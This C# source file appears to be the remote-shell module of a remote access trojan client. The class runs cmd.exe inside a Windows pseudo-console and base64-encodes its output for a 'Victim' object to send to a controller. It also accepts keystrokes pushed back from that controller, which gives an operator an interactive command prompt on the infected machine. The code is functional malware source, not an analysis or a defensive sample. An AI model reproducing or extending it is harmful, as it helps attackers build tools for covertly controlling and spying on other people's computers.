using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace winClient48
{
    public class clsfnXterm : IDisposable
    {
        //ConPTY
        private IntPtr m_hPC = IntPtr.Zero; //PseudoConsole

        //Pipes
        private SafeFileHandle m_hPipeInWrite;
        private SafeFileHandle m_hPipeOutRead;

        //Process
        private IntPtr m_hProcess = IntPtr.Zero;
        private IntPtr m_hThread = IntPtr.Zero;

        //Thread
        private bool m_bIsRunning = false;
        private Thread m_thread;

        //Callback
        public Action<byte[]> actOnOutput;

        private Victim m_victim { get; set; }

        public clsfnXterm(Victim victim)
        {
            m_victim = victim;

            actOnOutput += (byte[] abData) =>
            {
                m_victim.fnSendCommand(new string[]
                {
                    "xterm",
                    "output",
                    Convert.ToBase64String(abData)
                });
            };
        }

        public void fnStart()
        {
            int nCols = 80;
            int nRows = 24;

            WinAPI.CreatePipe(out var inRead, out m_hPipeInWrite, IntPtr.Zero, 0);
            WinAPI.CreatePipe(out m_hPipeOutRead, out var outWrite, IntPtr.Zero, 0);

            WinAPI.COORD size;
            size.X = (short)nCols;
            size.Y = (short)nRows;

            int hr = WinAPI.CreatePseudoConsole(size, inRead.DangerousGetHandle(), outWrite.DangerousGetHandle(), 0, out m_hPC);
            if (hr != 0)
                return;

            fnStartProcessWithConPTY("cmd.exe /Q /K");

            m_bIsRunning = true;
            m_thread = new Thread(fnReadLoop) { IsBackground = true };
            m_thread.Start();
        }

        public void fnStop()
        {
            m_bIsRunning = false;
            m_thread?.Join();

            if (m_hPC != IntPtr.Zero)
                WinAPI.ClosePseudoConsole(m_hPC);

            m_hPipeInWrite?.Dispose();
            m_hPipeOutRead?.Dispose();

            if (m_hProcess != IntPtr.Zero)
                WinAPI.CloseHandle(m_hProcess);
            if (m_hThread != IntPtr.Zero)
                WinAPI.CloseHandle(m_hThread);
        }

        public void Dispose() => fnStop();

        public void fnStartProcessWithConPTY(string szCommand)
        {
            var siEx = new WinAPI.STARTUPINFOEX();
            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);

            IntPtr lpSize = IntPtr.Zero;
            WinAPI.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            WinAPI.InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);

            WinAPI.UpdateProcThreadAttribute(
                siEx.lpAttributeList,
                0,
                (IntPtr)WinAPI.PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
                m_hPC,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero
            );

            bool bRet = WinAPI.CreateProcessW(
                null,
                szCommand,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                WinAPI.EXTENDED_STARTUPINFO_PRESENT,
                IntPtr.Zero,
                null,
                ref siEx,
                out WinAPI.PROCESS_INFORMATION pi
            );

            fnPushInput(Encoding.ASCII.GetBytes("echo HELLO_FROM_CMD\n"));
            fnPushInput(Encoding.ASCII.GetBytes("echo READY\n"));

            if (!bRet)
            {

                return;
            }

            m_hProcess = pi.hProcess;
            m_hThread = pi.hThread;

            WinAPI.DeleteProcThreadAttributeList(siEx.lpAttributeList);
            Marshal.FreeHGlobal(siEx.lpAttributeList);
        }

        private void fnReadLoop()
        {
            var abBuffer = new byte[4096];
            while (m_bIsRunning)
            {
                if (!WinAPI.ReadFile(m_hPipeOutRead, abBuffer, abBuffer.Length, out int nRead, IntPtr.Zero))
                    break;

                if (nRead > 0)
                {
                    var abData = new byte[nRead];
                    Buffer.BlockCopy(abBuffer, 0, abData, 0, nRead);

                    actOnOutput?.Invoke(abData);
                }
            }
        }

        public void fnPushInput(byte[] abData)
        {
            if (!m_bIsRunning)
                return;

            if (abData.Length == 1 && abData[0] == (byte)'\n')
                abData = Encoding.ASCII.GetBytes("\r\n");

            WinAPI.WriteFile(m_hPipeInWrite, abData, abData.Length, out _, IntPtr.Zero);
        }

        public void fnResize(int nCol, int nRow)
        {
            if (m_hPC == IntPtr.Zero)
                return;

            WinAPI.COORD size;
            size.X = (short)nCol;
            size.Y = (short)nRow;

            WinAPI.ResizePseudoConsole(m_hPC, size);
        }
    }
}
